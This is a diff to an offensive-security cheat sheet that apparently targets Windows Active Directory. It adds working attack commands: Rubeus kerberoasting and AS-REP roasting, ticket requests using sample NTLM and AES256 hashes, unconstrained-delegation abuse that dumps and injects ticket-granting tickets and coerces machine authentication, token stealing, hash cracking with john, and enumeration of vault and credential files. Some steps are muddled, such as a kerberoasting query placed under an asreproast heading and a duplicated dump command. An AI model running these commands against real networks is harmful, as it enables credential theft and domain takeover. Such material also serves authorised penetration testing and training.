@@ -127,6 +127,7 @@
 		- [pwncat](#pwncat)
 		- [rpcclient](#rpcclient)
 		- [Rubeus](#rubeus)
+        - [ADSearch](#ADSearch)
 		- [RunasCs](#runascs)
 		- [Seatbelt](#seatbelt)
 		- [smbpasswd](#smbpasswd)
@@ -320,8 +321,8 @@
 | Sharpersist | https://github.com/mandiant/SharPersist |
 | Sharpup | https://github.com/GhostPack/SharpUp |
 | PowerLurk | https://github.com/Sw4mpf0x/PowerLurk |
-| SUIDump | https://github.com/lypd0/SUIDump |
 | ADSearch |  https://github.com/tomcarver16/ADSearch |
+| SUIDump | https://github.com/lypd0/SUIDump |
 
 ### Exploit Databases
 
@@ -5291,6 +5292,10 @@ hashcat -m 13100 hashes.kerberoast /PATH/TO/WORDLIST/<WORDLIST> -r /usr/share/ha
 hashcat -m 13100 hashes.kerberoast2 /PATH/TO/WORDLIST/<WORDLIST> -r /usr/share/hashcat/rules/best64.rule --force
 ```
 
+```c
+.\Rubeus.exe kerberoast /user:<USERNAME> /nowrap
+```
+
 ###### Silver Tickets
 
 ###### Prerequisites
@@ -7594,6 +7599,7 @@ netsh firewall show state
 schtasks /query /fo LIST /v
 wmic qfe get Caption,Description,HotFixID,InstalledOn
 driverquery.exe /v /fo csv | ConvertFrom-CSV | Select-Object 'Display Name', 'Start Mode', Path
+vaultcmd /list //credentials
 ```
 
 ##### Access Control
@@ -8640,6 +8646,12 @@ srvinfo
 .\Rubeus.exe kerberoast /user:<USERNAME>
 ```
 
+```c
+Rubeus.exe asktgt /user:<USERNAME> /ntlm:59fc0f884922b4ce376051134c71e22c /nowrap // NTLM
+Rubeus.exe asktgt /user:<USERNAME> /aes256:4a8a74daad837ae09e9ecc8c2f1b89f960188cb934db6d4bbebade8318ae57c6 /nowrap //AES256
+Rubeus.exe asktgt /user:<USERNAME> /aes256:4a8a74daad837ae09e9ecc8c2f1b89f960188cb934db6d4bbebade8318ae57c6 /domain:<DOMAIN> /opsec /nowrap ///opsec  Rubeus to request the TGT  the Ticket Options 0x40810010
+```
+
 ##### Pass the Hash
 
 ```c
@@ -8655,12 +8667,79 @@ srvinfo
 .\RunasCs.exe -l 3 -d <DOMAIN> "<USERNAME>" '<PASSWORD>' 'C:\Users\<USERNAME>\Downloads\<FILE>.exe'
 ```
 
+#### ADSearch
+
+##### Asreproast 
+```c
+.\ADSearch.exe --search "(&(objectCategory=user)(servicePrincipalName=*))" --attributes cn,servicePrincipalName,samAccountName // Candidates for kerberoasting
+```
+
+Then 
+
+```c
+.\Rubeus.exe asreproast /user:<USERNAME> /nowrap
+```
+finally 
+
+```c
+john --format=krb5asrep --wordlist=wordlist <USERNAME>
+```
+
+##### Unconstrained Delegation
+
+```c
+.\ADSearch.exe --search "(&(objectCategory=computer)(userAccountControl:1.2.840.113556.1.4.803:=524288))" --attributes samaccountname,dnshostname
+```
+
+Get LUID of a krbtgt service
+
+```c
+Rubeus.exe triage
+```
+
+```c
+.\Rubeus.exe dump /luid:<LUID> /nowrap
+```
+
+Extract this TGT
+
+```c
+.\Rubeus.exe dump /luid:<LUID> /nowrap
+```
+
+```c
+.\Rubeus.exe createnetonly /program:C:\Windows\System32\cmd.exe /domain:<DOMAIN> /username:<USERNAME> /password:FakePass /ticket:doIFwj[...]MuSU8=
+```
+OR 
+
+Catch TGTs for computers accounts
+
+```c
+Rubeus.exe monitor /interval:10 /nowrap
+
+SharpSpoolTrigger.exe <ComputerNAME> <Listener>
+```
+
+OR
+
+Get the ProcessID
+
+```c
+Rubeus.exe createnetonly /program:C:\Windows\System32\cmd.exe /ticket:<TICKET>
+```
+
+```c
+steal_tocken <PID>
+```
+
 #### Seatbelt
 
 ```c
 .\Seatbelt.exe -group=system
 .\Seatbelt.exe -group=all
 .\Seatbelt.exe -group=all -full
+.\Seatbelt.exe WindowsVault
+.\Seatbelt.exe WindowsCredentialFiles
 ```
 
 #### smbpasswd
